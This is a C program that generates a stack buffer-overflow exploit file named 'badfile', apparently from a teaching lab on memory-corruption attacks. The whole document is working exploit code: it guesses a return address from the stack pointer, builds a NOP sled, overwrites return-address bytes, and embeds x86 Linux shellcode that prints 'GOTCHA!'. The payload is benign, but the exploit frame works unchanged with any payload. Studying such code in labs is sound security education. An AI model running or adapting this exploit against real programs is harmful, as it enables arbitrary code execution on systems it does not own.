#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#define OFFSET 1500

unsigned long get_esp(void) {
    __asm__("movl %esp, %eax");
}

char shell_code[] = "\xe9\x13\x00\x00\x00\x31\xdb\x31\xd2\x31\xc0\x59\xb3\x01\xb2"
                    "\x08\xb0\x04\xcd\x80\xb0\x01\xcd\x80\xe8\xe8\xff\xff\xff\x47"
                    "\x4f\x54\x43\x48\x41\x21\x0a";

int main() {
    unsigned long addr;
    FILE *badfile;
    char buffer[1024];
    addr = get_esp() + OFFSET;
    fprintf(stderr, "Using offset 0x%x\nShellcode size: %d\n", addr, sizeof(shell_code));
    memset(&buffer, 0x90, 1024);
    buffer[12] = addr & 0x000000ff;
    buffer[13] = (addr & 0x0000ff00) >> 8;
    buffer[14] = (addr & 0x00ff0000) >> 16;
    buffer[15] = (addr & 0xff000000) >> 24;
    memcpy(&buffer[sizeof(buffer)-sizeof(shell_code)], shell_code, sizeof(shell_code));
    badfile = fopen("badfile", "w");
    fwrite(buffer, 1024, 1, badfile);
    fclose(badfile);
}
